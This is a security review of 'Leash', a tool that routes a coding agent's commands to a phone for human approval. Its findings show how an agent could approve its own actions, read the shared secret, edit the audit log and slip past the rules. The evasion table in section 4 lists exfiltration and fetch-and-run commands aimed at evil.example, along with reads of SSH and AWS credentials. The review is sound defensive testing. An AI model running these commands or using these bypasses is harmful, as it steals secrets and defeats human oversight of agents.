# Leash Gap Report

| Item | Value |
|------|-------|
| Project | Leash (Team VibeSync) |
| Code reviewed | `leash-master.zip` (110 files, about 13,300 lines of Python, about 6,900 lines of Kotlin) and `leash-project-plan.md` v2 |
| Report date | Oct 5, 2026 |
| Reviewer note | Findings come from my own tests on Linux with Python 3.12. They are marked **Verified** (I ran a test) or **Code read** (I read the code but did not run it). |

---

## 1. Short answer

**Does the code work?** Part of it works. The Python side is a good prototype. The product does not yet work in real use.

**Will it work in real time with a real agent and a real phone?** Not yet. Three things stop it:

1. Anyone who can reach the daemon can approve a dangerous action. No signature is needed. **Verified.**
2. A real coding agent does not pass through Leash. The code only intercepts commands that a cooperating program sends to it. **Code read.**
3. The Android app was not built or run in this review. I have no Android SDK here. **Not verified.**

**Why the demo looks fine:** `leash demo` does not start a daemon, a phone or an agent. It calls the rule engine directly and writes scripted decisions ("tap", "biometric") into the audit log. **Verified.** The demo shows the design. It does not prove the system works.

---

## 2. What I tested

| Test | Result |
|------|--------|
| Full test suite (`pytest tests`) | **257 passed in 7.6 s** |
| Built-in demo (`leash demo`) | Runs to the end. It is scripted (see section 1). |
| Live daemon with a simulated attacker (4 attacks) | **All 4 attacks worked** (section 3) |
| Evasion battery: 27 commands against the rule engine | **11 of 27 missed** (section 4) |
| Agent started with `leash run`, then reads the daemon secret | **Secret read from file and from environment** |
| Android build and run | **Not done** (no SDK, no device) |
| macOS and Windows | **Not tested** |

The 257 tests are real and useful. They test components inside one process. They do not test an attacker, a real network, a real phone or a real agent.

---

## 3. What works today

| Area | State | Evidence |
|------|-------|----------|
| Rule engine for obvious dangerous commands (`rm -rf`, `curl \| sh`, `cat .env`, `nc`, `wget --post-file`) | Works | Evasion battery |
| Shell parser, risk categories, explanations (template based) | Works | Tests |
| Secret redaction, canary tokens, hidden-text scanner, workflow watchlist | Works as libraries | Tests |
| Worktree per session, snapshots, Rewind | Works in tests | 14 Rewind tests |
| Runaway guard, task scope, provenance taint (in process) | Works in tests | Tests |
| Agent receipt in Markdown | Works | Demo output |
| Audit log (JSONL) | Works, but not tamper-evident (G-08) | Code read |
| Signed WebSocket messages (HMAC, freshness, nonce replay check) | Works between the Python daemon and a client that has the secret | Tests, live test |
| Android UI (Compose screens, biometric prompt, vibration, foreground service, notifications with Approve and Deny) | Written. **Not built or run.** | Code read |

---

## 4. Gaps

**Severity:** Critical = the core promise fails. High = a major feature is missing or unsafe. Medium = a real problem that has a smaller effect.

### Critical

#### G-01. Anyone can approve a risky action over plain HTTP
- **Evidence (Verified).** A simulated agent sent `curl http://evil.example/x.sh | sh` to `/action`. A second client sent `POST /decision` with `verdict: allow` and no signature. The daemon returned `200` and the action was allowed. The audit log recorded the decision as made by **"tap"**.
- **Cause.** `_handle_post_decision` in `daemon/server.py` does no authentication and no signature check. The WebSocket path checks signatures. The HTTP path does not.
- **Impact.** The agent can approve its own actions. Leash then gives a false sense of safety.
- **Fix.** Module M1 and M2. Remove the HTTP decision route. Accept decisions only from a paired device that signs the exact action.

#### G-02. The shared secret is public to anyone who can reach the daemon
- **Evidence (Verified).**
  - `GET /pairing` and `GET /api/pair/pin` return `shared_secret` with no login.
  - The default secret is the fixed text `leash-dev-secret-change-me`.
  - `leash run` puts the secret in the agent's environment as `LEASH_SHARED_SECRET`.
  - The worktree is at `.leash/worktrees/<id>`. The agent read `../../pairing.json` and got the secret.
  - A simulated attacker used the leaked secret to sign a phone login. The daemon replied `auth_ack`.
- **Impact.** Any local process or any device on the network can pose as the phone.
- **Fix.** Module M1 and M2. One secret for the whole system must go. Use one key per paired device, and never give a key to the agent.

#### G-03. The agent can attack the control plane
- **Evidence (Verified).** An unauthenticated `POST /sessions/<id>/terminate` returned `200`. Pending actions are readable at `/pending`. Test routes such as `/api/test/sample-action` ship in the normal server. The agent can edit `.leash/audit.jsonl`.
- **Cause.** The agent and the approver share one trust domain. They use the same port, the same files and the same OS user.
- **Fix.** Module M1. Split the agent channel from the approver channel.

#### G-04. A real agent does not pass through Leash
- **Evidence (Code read, plus the `leash run` test).** `leash run` starts the agent with four environment variables. It does not change `PATH` or `SHELL`. The shell shim runs only when a program calls it on purpose. `shim/tool_hooks.py` holds Python classes. No adapter turns a real agent's hook format into those calls. I found no code for any agent's hook protocol, and no MCP proxy.
- **Impact.** A real agent runs `/bin/bash` directly. Leash sees nothing. Provenance (F1), Secret Fence reads and the hidden-text scan also depend on these hooks, so they stay silent for a real agent (see G-11).
- **Fix.** Module M3.

#### G-05. Unknown commands are allowed by default
- **Evidence (Verified).** Any command that matches no rule gets severity **low**. The server auto-allows low severity (`submit_action`, step 4). The evasion battery below shows what slips through.

| Case | Result |
|------|--------|
| `bash run.sh` (script written by the agent) | Missed |
| `python3 helper.py` | Missed |
| `ls -la` then a newline, then `curl ... -o /tmp/x` | **Missed and quick-allowed** (newline is not in the chain-character list) |
| `a=cu; b=rl; $a$b http://evil.example/x.sh` | Missed |
| `pytest -p evil_plugin` | **Missed and quick-allowed** |
| `git -c core.hooksPath=/tmp/h commit -m x` | Missed |
| `git diff --ext-diff` | **Missed and quick-allowed** |
| `ls -la ~/.aws` | **Missed and quick-allowed** |
| `tar czf - . \| ssh evil.example 'cat > x.tgz'` | Missed |
| `ln -s ~/.ssh/id_rsa k && cat k` | Missed |
| `find . -name '*.py' -exec curl -d @{} http://evil.example ';'` | Missed |
| `chmod +x run.sh && ./run.sh`, `npm install <new pkg>`, `pip install reqeusts`, `cat .env`, `cat ~/.ssh/id_rsa`, `nc ... < .env`, `wget --post-file`, `curl \| sh`, `rm -rf ~/`, `python -c` exfil, base64 decode and run | Caught |

  **Score: 11 of 27 missed.** The plan says Leash is "not a sandbox". That is honest. But several of these misses are plain rule gaps, not sandbox limits.
- **Fix.** Module M4. Change the default from "allow unknown" to "ask unknown".

#### G-06. The daemon runs the command with values chosen by the client
- **Evidence (Code read).** `execute_action` runs `create_subprocess_shell(request.command, cwd=request.cwd)`. The client sets `cwd` and `session` in the HTTP body. The command runs with the daemon's full environment and rights.
- **Impact.** The agent can set `cwd` outside its worktree and claim another session.
- **Fix.** Module M1 (session tokens, `cwd` check) and M3 (run in a contained environment).

### High

#### G-07. No transport security
- **Evidence (Code read).** The daemon binds `0.0.0.0` with plain HTTP and WebSocket. The Android manifest sets `usesCleartextTraffic="true"` and `allowBackup="true"`. The pairing PIN exchange returns the secret in clear text.
- **Fix.** Module M2.

#### G-08. The audit log can be changed, and it recorded a false decision
- **Evidence (Verified, Code read).** Records have no hash chain and no signature. The file sits where the agent can write. In the live test, a forged approval was logged as `by: tap`.
- **Fix.** Module M8.

#### G-09. The Android app is unproven, with known defects
- **Not verified.** I could not build or run the app.
- **Code read findings:**
  - I found no code that stores the pairing secret on the phone (no Keystore, no `SharedPreferences`, no `DataStore`). After a restart the phone probably must pair again.
  - I found no QR scanner and no camera dependency. Pairing uses a typed PIN.
  - **Signature mismatch.** Python signs JSON with `ensure_ascii` on, so a non-ASCII character becomes `\u2019`. The Kotlin signer writes raw characters. A device name such as "Jaskirat’s Pixel" gives a different signature, and the login fails. **Verified** for the Python side.
  - The pairing request builds JSON by string interpolation without escaping.
  - The biometric prompt is real, but the biometric result is not bound to a key. A screen tap fallback exists. The daemon cannot tell if a fingerprint was used.
- **Fix.** Module M9 and M2.

#### G-10. There is no on-device model
- **Evidence (Code read).** `build.gradle.kts` has no model runtime. The Kotlin explainer takes an optional `modelInferenceFn` that defaults to `null`. In the daemon, `risk_explainer.py` says it "simulates or executes" a model. I found no runtime in either place.
- **Impact.** The claims "on-device NPU inference" and the phone-side intent check (F2) are not built. The explanations are templates. Templates are acceptable as the fallback, but not as the headline feature.
- **Fix.** Module M10.

#### G-11. Provenance (F1) only works for the reference agent
- **Evidence (Code read).** Taint starts when a hook reports an untrusted read. No real agent calls the hook (G-04). Only `reference-agent/agent.py` and the demo script create these events.
- **Fix.** Module M3 and M5.

#### G-12. Package Gate has no online mode
- **Evidence (Code read).** `gates/package_gate.py` has no network call and no registry URL. The plan describes an online mode. It does not exist. The popular-package list is small and hard coded.
- **Fix.** Module M6. Until it is built, remove "online mode" from the pitch.

#### G-13. Office Kit is a clipboard wrapper, and the clipboard approval is weak
- **Evidence (Code read).** `daemon/office_kit.py` calls `pbcopy`, `xclip` and PowerShell. I found no Office Kit SDK call. The clipboard decision token uses the shared secret that leaks (G-02). Any local process, including the agent, can write to the clipboard.
- **Fix.** Module M11. Check the real Office Kit API on Day 0.

### Medium

| ID | Gap | Evidence | Module |
|----|-----|----------|--------|
| G-14 | Script preview fetches any URL from the laptop. It has no block for private addresses and follows redirects. The 256 KB cap is good. | Code read | M6 |
| G-15 | `pyproject.toml` lists `pydantic` (not used anywhere) and omits `aiohttp` (needed by the daemon). `pip install .` works, but the daemon fails at import without `aiohttp`. | Verified | M0 |
| G-16 | State is in memory. A daemon restart loses pending decisions. One default session is created at start. | Code read | M1, M7 |
| G-17 | Only Linux was tested. Commands run through `/bin/sh`. Windows and macOS paths and shell rules are not covered. | Not tested | M3 |
| G-18 | No CI file in the repo. No test covers G-01 to G-03, a real network fault, a real phone or a real agent. | Code read | M14 |
| G-19 | The demo is scripted and hard-codes "tap" and "biometric" decisions. | Verified | M15 |
| G-20 | The plan promises protections that the code does not deliver yet: "no cloud calls (verified)", "on-device NPU inference", "Package Gate online mode", and "approval needs a fingerprint". | Plan against code | M15 |

---

## 5. What to fix first

### Before the event (4 days)
Do these in order. Stop when a gate fails.

1. **M1 (part):** Remove `/decision` over HTTP. Remove `/pairing` and the secret from `/api/pair/pin`. Remove the test routes. Bind the agent channel to `127.0.0.1`. Do not pass the secret to the agent.
2. **M2 (part):** Pair with a one-time token. Use a per-device key. Verify decisions on the daemon.
3. **M9 (part):** Install the Android SDK. Build the app. Run it on your phone. Fix compile errors. Add golden signature tests for non-ASCII text.
4. **M3 (part):** Build one real adapter for the agent you will demo, plus the PATH shim directory. Tell the judges the protection level honestly (see the implementation document).
5. **M4 (part):** Add the 11 missed commands to the evasion corpus. Change "unknown" to "ask". Fix the newline and argument cases.
6. **M8 (part):** Add the hash chain and record the real decider.
7. **Run the demo with the real daemon, the real phone and the real agent.** Repeat it 20 times.

### After the event
Finish the remaining parts of M1 to M15 in the implementation document.

---

## 6. Claims to avoid until fixed

| Claim in the plan | Say instead |
|-------------------|-------------|
| "High-risk approvals require a fingerprint" | "The app asks for a fingerprint." Say this only after M9 binds the key to the biometric. |
| "On-device NPU inference" | "Rules decide. Templates explain." Say this until M10 is done. |
| "Package Gate online mode" | "Package Gate works offline with a bundled list." |
| "Stops a coding agent" | "Stops a coding agent that runs through Leash's hook and shim." |
| "No cloud calls (verified)" | Verify with a network capture first. |
| "Zero false alarms on demo scenes" | Measure it with the real phone and agent. |

---

## 7. Review limits

- I did not build or run the Android app.
- I did not test with a real coding agent, a real phone or a real Wi-Fi network.
- I tested on Linux only.
- I did not check competitors or the Office Kit API.
- Effort values in the implementation document are my estimates.
